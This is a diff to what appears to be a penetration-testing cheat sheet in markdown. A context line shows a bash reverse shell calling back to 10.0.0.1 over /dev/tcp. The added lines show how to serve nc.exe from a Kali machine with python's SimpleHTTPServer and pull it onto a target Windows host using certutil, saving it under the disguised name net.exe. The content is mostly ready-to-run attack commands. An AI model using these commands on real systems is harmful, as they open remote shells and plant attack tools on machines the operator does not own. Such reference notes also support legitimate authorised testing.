@@ -158,6 +158,11 @@ ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1m
 ```Bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
+__Download the reverse shell in windows__
+  - > __First we need to host the file in your kali linux__
+    - __`python -m SimpleHTTPServer 80`__
+  - > __Go to the target windows system type the below command in the `cmd`__
+    - __`certutil -urlcache -f http://127.0.0.1/nc.exe net.exe`__
 
 
 
